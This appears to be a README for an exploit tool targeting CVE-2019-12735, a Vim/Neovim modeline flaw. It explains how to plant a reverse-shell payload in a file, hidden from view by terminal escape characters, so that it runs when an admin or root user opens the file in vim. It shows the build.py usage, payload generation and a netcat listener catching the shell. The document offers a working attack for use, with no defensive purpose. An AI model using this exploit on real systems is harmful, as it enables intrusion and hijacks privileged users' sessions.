# CVE-2019-12735 vim exploit

Vim before 8.1.1365 and Neovim before 0.3.6 are vulnerable to arbitrary code execution via modelines by opening a specially crafted file.

## Desciption

We can abuse this by infect a file with a payload, when a admin / root user open the file with vim it executes the payload with that users euid
and in our case give the attacker a shell with his uid. We will also abuse terminal escape characters to make the payload invicible. When the file is read.

## Usage

Execute build.py to get the usage menu

```sh
⬢  CVE-2019-12735_vim  master ⦿ ./build.py

Generates CVE-2019-12735 vim payload.
Usage: build.py <lhost> <lport> <filename> [content]
```

Create payload, not if the already exists it will then instead append the payload to the end of the file.
The optional content variable is if you want to write some data that you want to be visible in the file when a admin
cat or read the file.

```sh
⬢  CVE-2019-12735_vim  master ⦿ ./build.py 127.0.0.1 1337 payload.txt
[+] Saved: payload.txt
```

You can use the 'vim' static compiled binary as a example if you just want to test the exploit

```sh
CVE-2019-12735_vim  master ⦿ ./vim payload.txt
```

At the same time in the attacker shell.

```sh
⬢  CVE-2019-12735_vim  master ⦿ nc -lnvp 1337
Connection from 127.0.0.1:44724
⬢  CVE-2019-12735_vim  master ⦿ id
id
uid=1000(nighter) gid=995(users) groups=995(users),974(docker),987(wheel)
```
